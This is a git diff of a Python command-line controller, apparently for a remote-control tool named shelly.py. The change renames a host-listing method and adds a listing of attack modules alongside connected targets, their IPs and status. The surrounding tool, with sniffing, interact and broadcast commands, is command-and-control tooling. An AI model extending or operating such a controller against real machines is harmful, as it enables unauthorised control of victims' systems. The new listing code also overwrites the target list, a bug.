@@ -29,7 +29,7 @@ class Controller(Host):
         self.mock_stdout = ""
 
 
-    def list_hosts(self):
+    def list_info(self):
         response = "[ Connected Targets ]\n\n"
 
         targets = self.db.all()
@@ -40,6 +40,16 @@ class Controller(Host):
         for target in targets:
             response += f"  {target['id']}   {target['ip']}  {target['status']}  {target['location']}\n"
         
+        response = "\n\n[ Available Modules ]\n\n"
+        response += "  Name  Description"
+        response += "  ----  -------------------------------\n"
+        for module in os.listdir('./modules'):
+            with open(f"./modules/{module}","r") as file:
+                for line in file.readlines():
+                    if line.startswith("# DESCRIPTION:"):
+                        desc = (line[13:]).strip()
+            response += f"  {module.split(".")[0]}\t{desc}\n"
+
         return response
 
     def sniffing(self, target_ip):
@@ -108,14 +118,14 @@ def main():
 
     match args.command:
         case "ls":
-            print(controller.list_hosts())
+            print(controller.list_info())
         case "interact":
             if args.target == "all":
                 parser.error(f"The command {args.command} can only take one target")
             controller.interact(int(args.target))
         case "run":
             if (args.module is None):
-                parser.error(f"The command {args.command} requires you to declare a module\n Avaliable modules:  {'  '.join(module_names)}")
+                parser.error(f"The command {args.command} requires you to declare a module\nModules can be found by running shelly.py ls")
             print("Run!")
             #controller.run()
         case "broadcast":
